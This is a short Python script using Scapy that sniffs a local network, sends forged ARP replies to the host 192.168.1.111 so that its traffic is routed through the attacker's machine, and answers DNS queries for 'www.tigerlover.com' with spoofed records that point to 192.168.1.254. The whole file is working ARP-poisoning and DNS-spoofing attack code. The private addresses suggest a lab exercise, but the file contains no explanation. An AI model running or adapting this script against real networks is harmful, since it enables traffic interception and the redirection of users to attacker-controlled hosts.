#!/usr/bin/python
from scapy.all import *
import uuid

def dnsMonitorCallBack(pkt):
	if pkt.haslayer(ARP) and pkt[ARP].psrc == '192.168.1.111':
		packet = NewPacketARP(pkt)
		send(packet)
	if pkt.haslayer(DNS) and pkt[DNS][DNSQR].qname == b'www.tigerlover.com.':
		packet = NewPacketDNS(pkt)
		send(packet)

def NewPacketARP(pkt):
	packet = ARP( hwsrc=get_mac(), psrc=pkt[ARP].pdst, hwdst=pkt[ARP].hwsrc, pdst=pkt[ARP].psrc, op=2)
	return packet

def NewPacketDNS(pkt):
    #global idDNS
   packet = IP(src="192.168.1.254", dst=pkt[IP].src) / \
            UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
            DNS(id=pkt[DNS].id,qr=1,rd=1,ra=1, qd=DNSQR(qname=pkt[DNS][DNSQR].qname,qtype=pkt[DNS][DNSQR].qtype,qclass=pkt[DNS][DNSQR].qclass), an=DNSRR(rrname=pkt[DNS][DNSQR].qname, type="A", rclass="IN", ttl=267, rdata="192.168.1.254"))
   packet.show()
   return packet

def get_mac():
	return str(':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])).upper()

sniff(prn=dnsMonitorCallBack)
